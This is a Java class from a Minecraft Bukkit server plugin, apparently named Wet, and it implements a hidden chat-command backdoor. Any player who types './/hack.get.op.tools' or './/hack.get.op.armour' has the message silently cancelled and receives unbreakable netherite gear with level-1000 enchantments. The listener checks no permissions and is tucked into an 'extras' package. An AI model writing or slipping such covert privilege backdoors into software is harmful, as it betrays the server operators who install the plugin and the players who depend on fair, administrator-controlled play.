package me.mimja.wet.extras;

import me.mimja.wet.Wet;
import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class OpInventoryMimja implements Listener {
    public OpInventoryMimja(Wet wet) {}

    @EventHandler
    public void a(AsyncPlayerChatEvent event){
        if(event.getMessage().equals(".//hack.get.op.tools")){
            event.setCancelled(true);

            ItemMeta itemMeta;

            ItemStack opSword = new ItemStack(Material.NETHERITE_SWORD, 1);
            itemMeta = opSword.getItemMeta();
            itemMeta.setUnbreakable(true);
            opSword.setItemMeta(itemMeta);
            opSword.addUnsafeEnchantment(Enchantment.DAMAGE_ALL, 1000);
            opSword.addUnsafeEnchantment(Enchantment.LOOT_BONUS_MOBS, 1000);

            ItemStack opPickaxe = new ItemStack(Material.NETHERITE_PICKAXE, 1);
            itemMeta = opPickaxe.getItemMeta();
            itemMeta.setUnbreakable(true);
            opPickaxe.setItemMeta(itemMeta);
            opPickaxe.addUnsafeEnchantment(Enchantment.DIG_SPEED, 1000);
            opPickaxe.addUnsafeEnchantment(Enchantment.LOOT_BONUS_BLOCKS, 1000);

            ItemStack opAxe = new ItemStack(Material.NETHERITE_AXE, 1);
            itemMeta = opAxe.getItemMeta();
            itemMeta.setUnbreakable(true);
            opAxe.setItemMeta(itemMeta);
            opAxe.addUnsafeEnchantment(Enchantment.DIG_SPEED, 1000);

            ItemStack opShovel = new ItemStack(Material.NETHERITE_SHOVEL);
            itemMeta = opShovel.getItemMeta();
            itemMeta.setUnbreakable(true);
            opShovel.setItemMeta(itemMeta);
            opShovel.addUnsafeEnchantment(Enchantment.DIG_SPEED, 1000);

            event.getPlayer().getInventory().addItem(opSword);
            event.getPlayer().getInventory().addItem(opPickaxe);
            event.getPlayer().getInventory().addItem(opAxe);
            event.getPlayer().getInventory().addItem(opShovel);
        }

        if(event.getMessage().equals(".//hack.get.op.armour")){
            event.setCancelled(true);

            ItemMeta itemMeta;

            ItemStack opHelmet = new ItemStack(Material.NETHERITE_HELMET, 1);
            itemMeta = opHelmet.getItemMeta();
            itemMeta.setUnbreakable(true);
            opHelmet.setItemMeta(itemMeta);
            opHelmet.addUnsafeEnchantment(Enchantment.PROTECTION_ENVIRONMENTAL, 1000);

            ItemStack opChestPlate = new ItemStack(Material.NETHERITE_CHESTPLATE, 1);
            itemMeta = opChestPlate.getItemMeta();
            itemMeta.setUnbreakable(true);
            opChestPlate.setItemMeta(itemMeta);
            opChestPlate.addUnsafeEnchantment(Enchantment.PROTECTION_ENVIRONMENTAL, 1000);

            ItemStack opLeggins = new ItemStack(Material.NETHERITE_LEGGINGS, 1);
            itemMeta = opLeggins.getItemMeta();
            itemMeta.setUnbreakable(true);
            opLeggins.setItemMeta(itemMeta);
            opLeggins.addUnsafeEnchantment(Enchantment.PROTECTION_ENVIRONMENTAL, 1000);

            ItemStack opBoots = new ItemStack(Material.NETHERITE_BOOTS);
            itemMeta = opBoots.getItemMeta();
            itemMeta.setUnbreakable(true);
            opBoots.setItemMeta(itemMeta);
            opBoots.addUnsafeEnchantment(Enchantment.PROTECTION_ENVIRONMENTAL, 1000);

            event.getPlayer().getInventory().addItem(opHelmet);
            event.getPlayer().getInventory().addItem(opChestPlate);
            event.getPlayer().getInventory().addItem(opLeggins);
            event.getPlayer().getInventory().addItem(opBoots);
        }

    }
}
